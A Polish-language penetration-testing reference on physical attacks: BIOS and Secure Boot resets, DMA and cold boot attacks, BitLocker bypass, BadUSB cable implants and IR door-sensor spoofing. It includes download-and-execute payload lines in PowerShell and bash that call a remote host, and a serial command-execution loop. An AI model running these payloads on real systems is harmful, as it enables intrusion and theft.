# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS i bezpieczeństwo systemu

**Resetowanie BIOS-u** można zrealizować na kilka sposobów. Większość płyt głównych zawiera **baterię**, która po wyjęciu na około **30 minut** zresetuje ustawienia BIOS, w tym hasło. Alternatywnie można zmienić położenie **jumpera na płycie głównej**, łącząc określone piny, aby zresetować te ustawienia.

W sytuacjach, gdy modyfikacje sprzętowe nie są możliwe lub praktyczne, rozwiązaniem są **narzędzia programowe**. Uruchomienie systemu z **Live CD/USB** z dystrybucjami takimi jak **Kali Linux** daje dostęp do narzędzi takich jak **_killCmos_** i **_CmosPWD_**, które mogą pomóc w odzyskaniu hasła BIOS.

W przypadkach, gdy hasło BIOS jest nieznane, wprowadzenie go nieprawidłowo **trzykrotnie** zazwyczaj skutkuje kodem błędu. Ten kod można wykorzystać na stronach takich jak [https://bios-pw.org](https://bios-pw.org), aby potencjalnie odzyskać działające hasło.

### Bezpieczeństwo UEFI

Dla nowoczesnych systemów korzystających z **UEFI** zamiast tradycyjnego BIOS, narzędzie **chipsec** może zostać użyte do analizy i modyfikacji ustawień UEFI, włącznie z wyłączeniem **Secure Boot**. Można to zrobić za pomocą następującego polecenia:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM przechowuje dane krótko po odcięciu zasilania, zazwyczaj przez **1 do 2 minut**. Tę trwałość można wydłużyć do **10 minut** przez zastosowanie zimnych substancji, takich jak azot ciekły. W tym przedłużonym oknie można wykonać **zrzut pamięci** przy użyciu narzędzi takich jak **dd.exe** i **volatility** do analizy.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** to narzędzie zaprojektowane do **fizycznej manipulacji pamięcią** przez DMA, kompatybilne z interfejsami takimi jak **FireWire** i **Thunderbolt**. Pozwala omijać procedury logowania poprzez modyfikację pamięci tak, by akceptowała dowolne hasło. Jednak jest nieskuteczne przeciwko systemom **Windows 10**.

---

## Live CD/USB for System Access

Podmiana binarek systemowych, takich jak **_sethc.exe_** lub **_Utilman.exe_**, kopią **_cmd.exe_** może zapewnić wiersz poleceń z uprawnieniami systemowymi. Narzędzia takie jak **chntpw** można użyć do edycji pliku **SAM** instalacji Windows, co pozwala na zmianę haseł.

**Kon-Boot** to narzędzie, które umożliwia logowanie się do systemów Windows bez znajomości hasła, przez tymczasową modyfikację jądra Windows lub UEFI. Więcej informacji na: [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Dostęp do ustawień BIOS.
- **F8**: Wejście do trybu Recovery.
- Naciśnięcie **Shift** po pojawieniu się banera Windows może pominąć automatyczne logowanie.

### BAD USB Devices

Urządzenia takie jak **Rubber Ducky** i **Teensyduino** służą jako platformy do tworzenia urządzeń **bad USB**, zdolnych do wykonania z góry określonych payloadów po podłączeniu do komputera ofiary.

### Volume Shadow Copy

Uprawnienia administratora pozwalają na tworzenie kopii wrażliwych plików, w tym pliku **SAM**, za pomocą PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implanty oparte na **ESP32-S3**, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli **USB-A→USB-C** lub **USB-C↔USB-C**, enumerują się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi‑Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i wejść na [http://cable-wind.local/](http://cable-wind.local/) (lub jego adres DHCP), aby dotrzeć do wbudowanego interfejsu HTTP.
- Interfejs przeglądarkowy oferuje zakładki *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Przechowywane payloady są tagowane według OS, układy klawiatur można zmieniać w locie, a ciągi VID/PID można modyfikować, by naśladować znane peryferia.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotować payloady, wywołać ich wykonanie i zarządzać poświadczeniami Wi‑Fi bez dotykania host OS — idealne do krótkotrwałych, fizycznych naruszeń.

### OS-aware AutoExec payloads

- Reguły AutoExec wiążą jeden lub więcej payloadów do uruchomienia natychmiast po enumeracji USB. Implant wykonuje lekkie OS fingerprinting i wybiera pasujący skrypt.
- Przykładowy przebieg:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie jest bezobsługowe, sama podmiana kabla ładującego może zapewnić „plug-and-pwn” początkowy dostęp w kontekście zalogowanego użytkownika.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Zapisany payload otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co przyjdzie na nowe urządzenie szeregowe USB. Minimalny wariant dla Windows to:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia TCP client (Python script, Android APK, or desktop executable) łączącego się z operatorem. Wszelkie bajty wpisane w TCP session są przekazywane do serial loop powyżej, umożliwiając zdalne wykonanie poleceń nawet na air-gapped hosts. Output jest ograniczony, więc operatorzy zazwyczaj uruchamiają blind commands (account creation, staging additional tooling, etc.).

### Powierzchnia aktualizacji HTTP OTA

- Ta sama warstwa webowa zwykle udostępnia niezabezpieczone aktualizacje firmware. Evil Crow Cable Wind nasłuchuje na `/update` i wgrywa dowolny przesłany plik binarny:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operatorzy terenowi mogą dynamicznie zmieniać funkcjonalność (np. wgrać firmware USB Army Knife) w trakcie akcji bez otwierania kabla, co pozwala implantowi przejść do nowych możliwości, pozostając nadal podłączonym do docelowego hosta.

## Ominięcie szyfrowania BitLocker

Szyfrowanie BitLocker można potencjalnie obejść, jeśli **recovery password** zostanie znalezione w pliku zrzutu pamięci (**MEMORY.DMP**). Narzędzia takie jak **Elcomsoft Forensic Disk Decryptor** lub **Passware Kit Forensic** mogą być użyte do tego celu.

---

## Inżynieria społeczna w celu dodania recovery key

Nowy BitLocker recovery key można dodać poprzez taktyki inżynierii społecznej, przekonując użytkownika do wykonania polecenia, które dodaje nowy recovery key złożony z samych zer, upraszczając w ten sposób proces odszyfrowywania.

---

## Wykorzystywanie chassis-intrusion / maintenance switches do przywrócenia BIOS do ustawień fabrycznych

Wiele nowoczesnych laptopów i desktopów w małym formacie zawiera **chassis-intrusion switch**, którą monitoruje Embedded Controller (EC) oraz firmware BIOS/UEFI. Chociaż głównym celem przełącznika jest zgłoszenie alarmu przy otwarciu urządzenia, producenci czasami implementują **undocumented recovery shortcut**, który uruchamia się, gdy przełącznik jest przełączony w określonym wzorze.

### Jak działa atak

1. Przełącznik jest podłączony do **GPIO interrupt** na EC.
2. Firmware na EC śledzi **czas i liczbę naciśnięć**.
3. Gdy rozpoznany zostanie zakodowany wzorzec, EC wywołuje procedurę *mainboard-reset*, która **kasuje zawartość systemowego NVRAM/CMOS**.
4. Przy następnym uruchomieniu BIOS wczytuje wartości domyślne – **supervisor password, Secure Boot keys i wszystkie niestandardowe ustawienia są usunięte**.

> Gdy Secure Boot zostanie wyłączony, a firmware password usunięty, atakujący może po prostu uruchomić dowolny zewnętrzny obraz OS i uzyskać nieograniczony dostęp do wewnętrznych dysków.

### Przykład z rzeczywistości – laptop Framework 13

Skrót recovery dla Framework 13 (11th/12th/13th-gen) to:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Po dziesiątym cyklu EC ustawia flagę, która instruuje BIOS, aby wyczyścił NVRAM przy następnym restarcie. Cała procedura zajmuje ~40 s i wymaga **tylko śrubokręta**.

### Ogólna procedura eksploatacji

1. Włącz urządzenie lub wykonaj suspend-resume, aby EC działał.
2. Usuń dolną pokrywę, aby odsłonić intrusion/maintenance switch.
3. Odtwórz specyficzny dla producenta wzorzec przełączania (sprawdź dokumentację, fora lub reverse-engineer firmware EC).
4. Złóż ponownie i uruchom ponownie – zabezpieczenia firmware powinny być wyłączone.
5. Uruchom live USB (np. Kali Linux) i przeprowadź post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Wykrywanie i łagodzenie

* Rejestruj zdarzenia chassis-intrusion w konsoli zarządzania OS i koreluj je z nieoczekiwanymi resetami BIOS.
* Stosuj **plomby zabezpieczające przed manipulacją** na śrubach/pokrywach, aby wykryć otwarcie.
* Przechowuj urządzenia w **obszarach z kontrolą fizycznego dostępu**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie.
* Tam, gdzie to możliwe, wyłącz funkcję vendor “maintenance switch reset” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego dla resetów NVRAM.

---

## Ukryte wstrzykiwanie IR przeciwko czujnikom No-Touch Exit

### Charakterystyka czujników
- Komercyjne “wave-to-exit” sensors łączą nadajnik near-IR LED z odbiornikiem w stylu TV-remote, który zgłasza stan logiczny wysoki dopiero po wykryciu wielu impulsów (~4–10) o prawidłowym carrierze (≈30 kHz).
- Plastikowy osłon blokuje nadajnik i odbiornik przed bezpośrednim widzeniem się, więc kontroler zakłada, że zweryfikowany carrier pochodzi z pobliskiego odbicia i aktywuje przekaźnik otwierający rygiel drzwi.
- Gdy kontroler uzna, że cel jest obecny, często zmienia obwiednię modulacji wychodzącej, ale odbiornik nadal akceptuje każdą serię impulsów pasującą do filtrowanego carriera.

### Przebieg ataku
1. Zarejestruj profil emisji – przypnij analizator logiczny do pinów kontrolera, aby nagrać zarówno przebiegi przed wykryciem, jak i po wykryciu, które sterują wewnętrzną IR LED.
2. Odtwórz tylko przebieg “post-detection” – usuń/ignoruj fabryczny emitter i steruj zewnętrzną IR LED wzorcem już załączonym od samego początku. Ponieważ odbiornik zwraca uwagę tylko na liczbę i częstotliwość impulsów, traktuje sfałszowany carrier jako prawdziwe odbicie i aktywuje linię przekaźnika.
3. Bramkuj transmisję – nadaj carrier w dostrojonych seriach (np. dziesiątki milisekund włączony, podobnie wyłączony), aby dostarczyć minimalną liczbę impulsów bez nasycania AGC odbiornika lub logiki obsługi zakłóceń. Ciągła emisja szybko odczula czujnik i uniemożliwia zadziałanie przekaźnika.

### Długodystansowe wstrzykiwanie refleksyjne
- Zastąpienie laboratoryjnej LED wysokoprądową diodą IR, driverem MOSFET i optyką skupiającą umożliwia niezawodne wyzwalanie z odległości ~6 m.
- Atakujący nie potrzebuje linii wzroku do apertury odbiornika; skierowanie wiązki na ściany wewnętrzne, półki lub framugi drzwi widoczne przez szybę pozwala energii odbitej wejść w ~30° pole widzenia i naśladować zbliżone machnięcie ręki.
- Ponieważ odbiorniki oczekują tylko słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbijać się od wielu powierzchni i nadal pozostawać powyżej progu detekcji.

### Uzbrojona latarka
- Wbudowanie drivera w komercyjną latarkę ukrywa narzędzie na widoku. Zamień widoczny LED na wysokoprądową IR LED dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny) do generowania ≈30 kHz burstów i użyj MOSFET do odprowadzania prądu diody.
- Obiektyw zoom typu teleskopowego zawęża wiązkę dla zasięgu i precyzji, natomiast silniczek wibracyjny sterowany przez MCU daje potwierdzenie haptyczne, że modulacja jest aktywna bez emisji światła widzialnego.
- Przełączanie przez kilka zapisanych wzorców modulacji (nieco różne częstotliwości carrier i obwiednie) zwiększa kompatybilność między rodzinami czujników z rebrandingiem, pozwalając operatorowi przeszukać powierzchnie refleksyjne, aż przekaźnik kliknie słyszalnie i drzwi się otworzą.

---

## Referencje

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
